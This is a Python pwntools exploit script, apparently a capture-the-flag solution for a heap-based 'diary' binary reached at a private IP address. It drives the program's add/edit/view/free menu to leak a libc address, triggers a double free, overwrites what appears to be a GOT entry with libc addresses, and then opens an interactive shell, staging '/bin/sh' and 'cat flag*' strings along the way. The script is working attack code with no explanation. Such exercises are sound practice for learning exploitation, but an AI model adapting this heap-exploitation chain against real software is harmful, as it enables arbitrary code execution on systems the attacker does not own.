from pwn import *

#c = process("./diary", env={"LD_PRELOAD":"./libc.so.6"})
c = remote("10.10.4.10", 2228)
def malloc(mark, size, data):
	c.recvuntil(b'Enter your choice: ')
	c.sendline(b'1')
	c.recvuntil(b'Enter your mark: ')
	c.sendline(str(int(mark)).encode())
	c.recvuntil(b'Enter size of comment: ')
	c.sendline(str(int(size)).encode())
	c.recvuntil(b'Enter comment: ')
	c.send(data)

def edit(idx, mark, size, data):
	c.recvuntil(b'Enter your choice: ')
	c.sendline(b'2')
	c.recvuntil(b'Enter index: ')
	c.sendline(str(int(idx)).encode())
	c.recvuntil(b'Enter your mark: ')
	c.sendline(str(int(mark)).encode())
	c.recvuntil(b'Enter size of comment: ')
	c.sendline(str(int(size)).encode())
	c.recvuntil(b'Enter comment: ')
	c.sendline(data)

def view(idx):
	c.recvuntil(b'Enter your choice: ')
	c.sendline(b'3')
	c.recvuntil(b'Enter index: ')
	c.sendline(str(int(idx)).encode())
	return c.recvuntil(b'1) Add')

def free(idx):
	c.recvuntil(b'Enter your choice: ')
	c.sendline(b'4')
	c.recvuntil(b'Enter index: ')
	c.sendline(str(int(idx)).encode())
#gdb.attach(c)
# LEAK
for i in range(8):
	malloc(0x41, 0x100, b'/bin/sh\x00')

malloc(0x41, 0x100, b'A'*0x10)
for i in range(8):
	free(i)

leak = u64(view(7)[16:22].ljust(8, b'\x00'))
print(hex(leak))
libc = leak - 0x1eabe0
print(hex(libc))
for i in range(8):
        malloc(0x41, 0x100, b'cat flag*')
# END

# DOUBLE FREE
for i in range(17, 17+4):
	malloc(0x41, 0x10, b'B'*0x10) # 0x10 its arb free maaaan
malloc(0x41, 0x10, b'C'*0x10)
malloc(0x41, 0x10, b'C'*0x10)
malloc(0x41, 0x10, b'C'*0x10)

for i in range(17, 17+8):
	free(i)

free(17+8-4)
free(17+9-4)
free(17+8-4)
input()
for i in range(17, 17+8):
	if i == 22: break
	if i == 20: malloc(0x41414141, 0x20, b'C'*0x10)
	malloc(0x404018, 0x10, p64(libc+0x554e0)+p64(libc+0x87490))

c.interactive()
